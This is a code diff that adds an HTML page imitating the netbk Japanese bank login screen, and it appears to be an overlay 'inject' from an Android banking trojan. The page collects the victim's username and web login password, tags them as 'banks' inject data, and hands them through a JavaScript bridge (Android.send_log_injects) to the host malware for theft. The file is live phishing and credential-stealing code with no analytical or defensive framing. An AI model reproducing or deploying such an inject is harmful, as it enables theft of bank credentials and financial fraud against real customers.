@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>netbk</title>
+    <link rel="shortcut icon" href="jp.co.netbk.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #001d6e;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: center;
+    background-size: 100%;
+    padding: 0px 0px 10px 0px;
+    background-size: 80%;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 10px 0px;
+    color: #d9d8d8;
+    text-align: left;
+    outline: none;
+    border: 1px solid #335cac;
+    background: #335cac;
+    border-radius: 10px;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 30px 0px 0px 0px;
+    outline: none;
+    float: right;
+    color: #000;
+    border: none;
+    font-size: 14px;
+    -webkit-appearance: none;
+    cursor: pointer;
+    background: #fff;
+    border-radius: 3px;
+    border: 1px solid #fff;
+}
+input::placeholder {
+    color: #d9d8d8;
+    font-size: 15px;
+}
+</style>
+
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo">
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAtCAYAAADoSujCAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTM4IDc5LjE1OTgyNCwgMjAxNi8wOS8xNC0wMTowOTowMSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTcgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkRGOEI5ODM0RUQ0QzExRTlCRDRCODZBODA3RDU5MkI3IiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkRGOEI5ODM1RUQ0QzExRTlCRDRCODZBODA3RDU5MkI3Ij4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6REY4Qjk4MzJFRDRDMTFFOUJENEI4NkE4MDdENTkyQjciIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6REY4Qjk4MzNFRDRDMTFFOUJENEI4NkE4MDdENTkyQjciLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4A+ew+AAAE/0lEQVR42mL8//8/w1AGTAxDHIx6YKABCzUNY6zZIZJpJO2jJcajqCHGo6QOxMJcbELXXn6+df3F5zuXX36+233h2bb/NS4PqGYpKBNTghna96r1Hbhbd//t18NA/v3/hMH9Fx+/n5548G4jQ/cBHYrtJ1tj4Sa2jr23K4h0NE7PLD/3dDJDzXYxunrAff5pr+efvp/+TyVQvuVaTtnmq1l08QAouVAY6nAw9cj9/wyFG/9POHAXHBtrLjybTlMPbL7yfC41HD/z2IP/DMWb/zOEL/mfufYSSpJ69/XXRZp4IH7lhShKHT/3xMP/DKVbwA4H4+bdWPPFnhuvFlPVA2YzjjtQ4vg5x4EOL9+KcDgUb7/2AmfmBuULYtzGSKgtxFi9XeR/q+dpIFOB1CJ65rGHDBlbrjIw3HuPKakjzgCsD/Bpf+C94Ezu1gSTLRRVZJ3OqmmkOn7a0QcM2duvMzDceYdTTaaWOCFjFCZ4axYD6S1kNyVAoV/mpJJKrMMnH77PwFi3gyF78lG8jgcBP00xguapinIrVG67nkO2B5odlBOICf3+g/cYGOt3MuRNPcbAcOstUZ6V4uckRplCu5dmMWP+JiayklCCqVwwPvne/XcZSvbdZmC4/ZbkJow0PwexShUc9SRAmWUXSTEgO+mImYwAhwQu+eDF5xhKZp4gy/EgwMNOfDsyVkfCleQk1GQuF4ov+ayNNQKXJOSC559+EK3WT0fChWQPaIrzKBEy+GqKOQODMBdZHnj2kXgPCHOzCZDsAREediFCBmtJ8DKUe2mQ5YEzjz/Qtkcmws0mRIwBje7qDAzKQiRbvPT6K9I6S9XbhUjyAA8bM1Fpg52FiaHMUp5kD5y6+pIU5QoMONyD0wNvv/4iOo5TLUj3AMOrL8B23TViVT9g+Pr7HWke+Pb7HbGmq4hwk1Ui9Wy6xnD1+Sfiur5d3t9I8sCbrz9JymUyfBykx8Knnwweqy/RJhMfuPP2JCkGaZPjASB4AmyxGk4/jlfNjZef75Dsgfqj95eB0x6RQImPnexQFGBlYjh+H3eKXXXh2XaSPfC/yePFrpuvDhHriDsffpDscDNHZYYDLe4M+4EVoqUizqL4Qf3FZzvIasz1HH243E1dzI6YFumJj9+Jdri+nSJDr7Mqg7O6KEG1h++9PfW/zPEaWc3pXUmmOy4//3SDGEd9fka4NFGyVmDYWu/CcCHLiijHg0I/b+etqRSNjfYcur+QUF7YcR1YKT3+iFOe11yWYWONM8PdXGsGL03ii9uNl1/sOp9piTcZMxIzPwCMhe26knweuORtZ59kOLIXS0FhLM2w2k2dIURfkpy8/YCx96D//2L7SxSPTuvNOJ6IKxaOP3iH6Xigg5eVOTD8L3Ug2/H2s0+mEnI8SYO7DB37NLANrTjOOYkYKmna/X/hyUeUjnvdr9p6PY8mI3Nxq1AHt1aeewpxeP0O8GgbFQDJw4skj41azDzu9PXnn+uP33//z1C97f+kQ/eoNcZ7v3bHjQK6jE4zNOyU6dp3u4pKg7z3Tz96v9Fg2jE7us4PgLDG5CNW+269WkqmR+7fefPlYPiycyEDMsGBjNUmHbFo23OrAjTzQsAzILn780487Hade8qDGnYTVQ+Q1PVr2aPAC+yO6gI74jLAfjU3GzPH088/39358vPdvS8/3/yvdL5DVftGJ7pHPTDCPQAQYAD1QijvVPwr1AAAAABJRU5ErkJggg==" style="width: 30px; margin-top: 30px;">
+</div>
+
+<div class="area" style="background: none; padding: 30px; border-radius: 3px;">
+        <input type="text" name="login" id="login" placeholder="ユーザーネーム" style="height: 50px;">
+        <input type="password" name="password" id="password" placeholder="WEBログインパスワード" style="height: 50px;">
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form()" value="ログイン">
+        <a href="#" style="position: relative; top: 20px; text-decoration: none; color: #fff;">ログインでお困りのかた</a>
+</div>
+
+</div>
+
+</fieldset> 
+
+<script>
+function send_form()
+{
+    if (document.getElementById("login").value == '')
+{
+    alert ('すべてのフィールドが必要！');
+    return false;
+}
+if (document.getElementById("password").value == '')
+{
+    alert ('すべてのフィールドが必要！');
+    return false;
+}
+var data = {};
+    data.login = document.getElementById('login').value;
+    data.password = document.getElementById('password').value;
+    data.type_injects = "banks";
+    data.closed = "close_activity_injects";
+    
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+            Android.send_log_injects(JSON.stringify(data))
+        } catch (err) {}
+    }else{
+        alert(JSON.stringify(data));
+    } 
+}
+</script>
+
+</body>
+</html>
